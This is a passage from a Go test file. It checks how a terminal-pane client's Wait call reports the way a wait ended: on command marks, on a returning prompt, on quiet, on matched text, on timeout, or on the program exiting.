	look, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 30000, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.GaveUp || ended.Because != EndedOnMarks {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnMarks)
	}
	if !look.Marks || look.Running {
		t.Errorf("the look says marks %v, running %v", look.Marks, look.Running)
	}
	if !look.HasStatus || look.Status != 2 {
		t.Errorf("the look says exit %d, known %v; want 2", look.Status, look.HasStatus)
	}
}

// A command that had already finished before the wait began does not end
// it: a wait watches for what happens while it is on.
func TestAWaitIgnoresACommandThatHadAlreadyFinished(t *testing.T) {
	w, _, code := listening(t)
	w.marking()
	w.finished(0)
	w.say("$ ")
	c := dialled(t, code)
	pane := opened(t, c, code)

	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 40, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.Because != EndedOnQuiet {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnQuiet)
	}
}

// A shell that marks nothing is watched for the prompt coming back,
// which is what a command finishing looks like from outside.
func TestAWaitEndsWhenThePromptComesBack(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ sleep 1")
	c := dialled(t, code)
	pane := opened(t, c, code)

	go func() {
		time.Sleep(30 * time.Millisecond)
		w.say("$ sleep 1\n$ ")
		w.promptBack(true)
	}()

	look, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 30000, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.GaveUp || ended.Because != EndedOnPrompt {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnPrompt)
	}
	if look.Marks {
		t.Error("the look says the shell marks its commands")
	}
}

// A prompt that was already back when the wait began does not end it.
// Otherwise a wait asked twice comes back at once the second time.
func TestAWaitDoesNotEndOnAPromptThatWasAlreadyBack(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	w.promptBack(true)
	c := dialled(t, code)
	pane := opened(t, c, code)

	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 40, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.Because != EndedOnQuiet {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnQuiet)
	}
}

// Every other way a wait can end says which one it was, so an agent can
// tell a command that finished from a screen that merely stopped moving.
func TestAWaitSaysHowElseItEnded(t *testing.T) {
	t.Run("the text", func(t *testing.T) {
		w, _, code := listening(t)
		w.say("Build succeeded")
		c := dialled(t, code)
		pane := opened(t, c, code)

		_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "succeeded", TimeoutMS: 2000})
		if err != nil {
			t.Fatalf("wait: %v", err)
		}
		if ended.GaveUp || ended.Because != EndedOnText {
			t.Errorf("the wait ended %+v, want %q", ended, EndedOnText)
		}
	})

	t.Run("the time", func(t *testing.T) {
		w, _, code := listening(t)
		w.say("still going")
		c := dialled(t, code)
		pane := opened(t, c, code)

		_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 150})
		if err != nil {
			t.Fatalf("wait: %v", err)
		}
		if !ended.GaveUp || ended.Because != EndedOnTime {
			t.Errorf("the wait ended %+v, want the time running out", ended)
		}
	})

	t.Run("the program", func(t *testing.T) {
		w, _, code := listening(t)
		w.say("$ exit")
		c := dialled(t, code)
		pane := opened(t, c, code)
		w.finish()

		_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 2000})
		if err != nil {
			t.Fatalf("wait: %v", err)
		}
		if ended.GaveUp || ended.Because != EndedOnGone {
			t.Errorf("the wait ended %+v, want %q", ended, EndedOnGone)
		}
	})
}
